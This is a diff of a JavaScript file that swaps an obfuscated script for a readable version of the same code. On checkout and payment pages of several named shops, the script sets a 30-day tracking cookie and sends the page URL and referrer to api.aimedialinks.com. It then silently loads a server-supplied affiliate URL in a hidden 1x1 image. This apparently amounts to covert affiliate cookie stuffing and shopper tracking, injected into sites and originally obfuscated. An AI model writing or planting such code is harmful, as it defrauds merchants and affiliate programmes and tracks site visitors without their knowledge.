@@ -1,1 +1,93 @@
-function _0x19c3(_0x1c54b5,_0xb3fb96){_0x1c54b5=_0x1c54b5-0x1db;const _0x5dc038=_0x5dc0();let _0x19c37b=_0x5dc038[_0x1c54b5];return _0x19c37b;}function _0x5dc0(){const _0x5556f7=['4311672gaIsvO','addEventListener','some','POST',';\x20expires=','12RAqaKV','cart','json','href','4766Hdpkbn','replace','1912schfxf','tracking_uuid','tracking_done','none','477qBKCPR','onerror','hostname','body','https://api.aimedialinks.com/api/track-user','toUTCString','589HWnBwz','pay','src','payment','affiliate_url','6233493JICWrZ','includes','display','stringify','width','interactive','(?:^|;\x20)','img','setItem','style','toLowerCase','cookie','tracking_uuid=','readyState','random','580135zLIftg','131690qIfmId','DOMContentLoaded','application/json','Tracking\x20error','3641Dsublf','https://api.aimedialinks.com/api/fallback-pixel?id=','location','height','match','complete','getItem','2887470pozLoh','review-order'];_0x5dc0=function(){return _0x5556f7;};return _0x5dc0();}(function(_0x2ee10e,_0x409e88){const _0x30631c=_0x19c3,_0x5559fd=_0x2ee10e();while(!![]){try{const _0x3bb159=parseInt(_0x30631c(0x206))/0x1*(-parseInt(_0x30631c(0x1fa))/0x2)+-parseInt(_0x30631c(0x1f1))/0x3+parseInt(_0x30631c(0x1f6))/0x4*(-parseInt(_0x30631c(0x1e3))/0x5)+parseInt(_0x30631c(0x1ef))/0x6+-parseInt(_0x30631c(0x20b))/0x7+-parseInt(_0x30631c(0x1fc))/0x8*(-parseInt(_0x30631c(0x200))/0x9)+parseInt(_0x30631c(0x1e4))/0xa*(parseInt(_0x30631c(0x1e8))/0xb);if(_0x3bb159===_0x409e88)break;else _0x5559fd['push'](_0x5559fd['shift']());}catch(_0x5187c2){_0x5559fd['push'](_0x5559fd['shift']());}}}(_0x5dc0,0xbcd54),(function(){const _0x5cfe0e=_0x19c3;function _0x3887cd(){const _0x4ff2ca=_0x19c3;return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'[_0x4ff2ca(0x1fb)](/[xy]/g,function(_0x590df9){const _0x30edb0=_0x4ff2ca,_0x5c48d6=Math[_0x30edb0(0x1e2)]()*0x10|0x0,_0x1f6d57=_0x590df9==='x'?_0x5c48d6:_0x5c48d6&0x3|0x8;return _0x1f6d57['toString'](0x10);});}function _0x253889(_0x2b2a0b){const _0x3297c5=_0x19c3,_0xcce48d=document[_0x3297c5(0x1df)][_0x3297c5(0x1ec)](new RegExp(_0x3297c5(0x211)+_0x2b2a0b+'=([^;]*)'));return _0xcce48d?decodeURIComponent(_0xcce48d[0x1]):'';}function _0x3f269d(_0x1b069a){const _0x24f96c=_0x19c3,_0x1d578f=document['createElement'](_0x24f96c(0x1db));_0x1d578f[_0x24f96c(0x208)]=_0x1b069a,_0x1d578f[_0x24f96c(0x20f)]=0x1,_0x1d578f[_0x24f96c(0x1eb)]=0x1,_0x1d578f[_0x24f96c(0x1dd)][_0x24f96c(0x20d)]=_0x24f96c(0x1ff),_0x1d578f[_0x24f96c(0x201)]=function(){},document[_0x24f96c(0x203)]['appendChild'](_0x1d578f);}function _0x27eb3b(){const _0x2ba2c8=_0x19c3,_0x4f0e49=[_0x2ba2c8(0x1f7),'checkout',_0x2ba2c8(0x207),'shipping',_0x2ba2c8(0x1f0),_0x2ba2c8(0x209)];return _0x4f0e49[_0x2ba2c8(0x1f3)](function(_0x256e48){const _0x408b4a=_0x2ba2c8;return window[_0x408b4a(0x1ea)]['pathname'][_0x408b4a(0x1de)]()[_0x408b4a(0x20c)](_0x256e48);});}async function _0x544960(){const _0x17ef4b=_0x19c3;if(sessionStorage[_0x17ef4b(0x1ee)]('tracking_done'))return;try{const _0x28307a=_0x253889(_0x17ef4b(0x1fd))||_0x3887cd(),_0x5db708=new Date(Date['now']()+0x1e*0x15180*0x3e8)[_0x17ef4b(0x205)]();document['cookie']=_0x17ef4b(0x1e0)+_0x28307a+_0x17ef4b(0x1f5)+_0x5db708+';\x20path=/;\x20SameSite=Lax';const _0x38f5f2=await fetch(_0x17ef4b(0x204),{'method':_0x17ef4b(0x1f4),'headers':{'Content-Type':_0x17ef4b(0x1e6)},'body':JSON[_0x17ef4b(0x20e)]({'url':location[_0x17ef4b(0x1f9)],'referrer':document['referrer'],'unique_id':_0x28307a,'origin':location[_0x17ef4b(0x202)]})}),_0x48cecb=await _0x38f5f2[_0x17ef4b(0x1f8)]();_0x48cecb['success']&&_0x48cecb['affiliate_url']?(_0x3f269d(_0x48cecb[_0x17ef4b(0x20a)]),sessionStorage[_0x17ef4b(0x1dc)](_0x17ef4b(0x1fe),'1')):_0x3f269d(_0x17ef4b(0x1e9)+_0x28307a);}catch(_0x405d7a){console['error'](_0x17ef4b(0x1e7),_0x405d7a);}}function _0x546480(){const _0x1ec8b8=_0x19c3,_0x2e3d03=window['location'][_0x1ec8b8(0x202)],_0x29e20e={'www.fareastflora.com':{'always':![],'cartExtra':!![]},'aimedialinks.com':{'always':!![],'cartExtra':!![]},'alokozayshop.com':{'always':![],'cartExtra':!![]}},_0xb34c72=_0x29e20e[_0x2e3d03];if(_0xb34c72){if(_0xb34c72['cartExtra']&&_0x27eb3b())_0x544960();else _0xb34c72['always']&&_0x544960();}}document[_0x5cfe0e(0x1e1)]===_0x5cfe0e(0x1ed)||document[_0x5cfe0e(0x1e1)]===_0x5cfe0e(0x210)?_0x546480():window[_0x5cfe0e(0x1f2)](_0x5cfe0e(0x1e5),_0x546480,{'once':!![]});}()));
+(function () {
+
+    function generateUUID() {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+            const r = Math.random() * 16 | 0;
+            const v = c === 'x' ? r : (r & 0x3 | 0x8);
+            return v.toString(16);
+        });
+    }
+
+    function getCookie(name) {
+        const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
+        return match ? decodeURIComponent(match[1]) : '';
+    }
+
+    function fireTracking(url) {
+        const img = document.createElement('img');
+        img.src = url;
+        img.width = 1;
+        img.height = 1;
+        img.style.display = 'none';
+        document.body.appendChild(img);
+    }
+
+    function isCartPage() {
+        const cartPatterns = ['cart', 'checkout', 'pay', 'shipping', 'review-order', 'payment'];
+        return cartPatterns.some(function (path) {
+            return window.location.pathname.toLowerCase().includes(path);
+        });
+    }
+
+    async function initTracking() {
+        
+
+        try {
+            const uniqueId = getCookie('tracking_uuid') || generateUUID();
+            const expires = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();
+
+            document.cookie =
+                'tracking_uuid=' + uniqueId +
+                '; expires=' + expires +
+                '; path=/; SameSite=Lax';
+
+            const response = await fetch('https://api.aimedialinks.com/api/track-user', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    url: location.href,
+                    referrer: document.referrer,
+                    unique_id: uniqueId,
+                    origin: location.hostname
+                })
+            });
+
+            const result = await response.json();
+
+            if (result.success && result.affiliate_url) {
+                fireTracking(result.affiliate_url);
+                sessionStorage.setItem('tracking_done', '1');
+            } else {
+                fireTracking('https://api.aimedialinks.com/api/fallback-pixel?id=' + uniqueId);
+            }
+
+        } catch (error) {
+            console.error('Tracking error', error);
+        }
+    }
+
+    function run() {
+        const hostname = window.location.hostname;
+
+        const siteConfig = {
+            'www.fareastflora.com': { always: false, cartExtra: true },
+            'aimedialinks.com':     { always: true,  cartExtra: true },
+            'alokozayshop.com':     { always: true, cartExtra: true }
+        };
+
+        const config = siteConfig[hostname];
+
+        if (config) {
+            if (config.cartExtra && isCartPage()) {
+                initTracking();
+            } else if (config.always) {
+                initTracking();
+            }
+        }
+    }
+
+    document.readyState === 'complete' || document.readyState === 'interactive'
+        ? run()
+        : window.addEventListener('DOMContentLoaded', run, { once: true });
+
+}());
